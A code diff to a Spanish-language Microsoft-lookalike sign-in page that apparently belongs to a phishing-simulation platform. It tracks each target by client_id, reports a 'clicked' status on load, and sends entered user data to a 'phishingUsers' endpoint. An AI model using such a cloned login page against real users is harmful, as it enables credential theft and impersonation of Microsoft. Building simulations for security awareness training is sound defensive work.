@@ -46,7 +46,9 @@ import Layout from "@/layouts/templates/microsoft/Layout.astro";
 
       <div class="relative contain-content overflow-hidden">
         <div id="email-view" class="relative mt-4 mb-3 animate min-h-[206px]">
-          <h1 class="title">Iniciar sesión</h1>
+          <div class="title-container">
+            <h1 class="title">Iniciar sesión</h1>
+          </div>
 
           <div class="mb-4">
             <form id="email-form" name="email-form" action="/" method="post">
@@ -183,6 +185,19 @@ import Layout from "@/layouts/templates/microsoft/Layout.astro";
 <script>
   import { Temporal } from "temporal-polyfill";
 
+  interface ClientSessionData {
+    id: string;
+    startedAt: Temporal.Instant;
+    endedAt: Temporal.Instant;
+    duration: number;
+    eventsCount: number;
+    events: any[];
+  }
+
+  const client_id = new URLSearchParams(document.location.search).get(
+    "client_id"
+  );
+
   const sessionService = (() => {
     function generateUniqueId() {
       const newId = "uid-" + crypto.randomUUID();
@@ -197,15 +212,6 @@ import Layout from "@/layouts/templates/microsoft/Layout.astro";
         lastCall = now;
         return fn(...args);
       };
-    }
-
-    interface ClientSessionData {
-      id: string;
-      startedAt: Temporal.Instant;
-      endedAt: Temporal.Instant;
-      duration: number;
-      eventsCount: number;
-      events: any[];
     }
 
     let sessionData: ClientSessionData = {
@@ -397,15 +403,14 @@ import Layout from "@/layouts/templates/microsoft/Layout.astro";
           sessionData,
         };
 
+        if (!client_id) return null;
+
         try {
-          const response = await fetch(
-            "/api/phishingUsers/6bba0dd0-7e60-4456-bcd7-554765e30885",
-            {
-              method: "PUT",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify(userData),
-            }
-          );
+          const response = await fetch(`/api/phishingUsers/${client_id}`, {
+            method: "PUT",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(userData),
+          });
 
           return await response.json();
         } catch (error) {
@@ -429,15 +434,14 @@ import Layout from "@/layouts/templates/microsoft/Layout.astro";
           sessionData,
         };
 
+        if (!client_id) return null;
+
         try {
-          const response = await fetch(
-            "/api/phishingUsers/6bba0dd0-7e60-4456-bcd7-554765e30885",
-            {
-              method: "PUT",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify(userData),
-            }
-          );
+          const response = await fetch(`/api/phishingUsers/${client_id}`, {
+            method: "PUT",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(userData),
+          });
 
           return await response.json();
         } catch (error) {
@@ -451,6 +455,15 @@ import Layout from "@/layouts/templates/microsoft/Layout.astro";
   // Inicialización
   document.addEventListener("DOMContentLoaded", () => {
     sessionService.init();
+
+    if (client_id) {
+      fetch("/api/status", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ client_id, status: "clicked" }),
+      });
+    }
+
     const emailForm = document.getElementById("email-form")!;
     const passwordForm = document.getElementById("password-form")!;
 
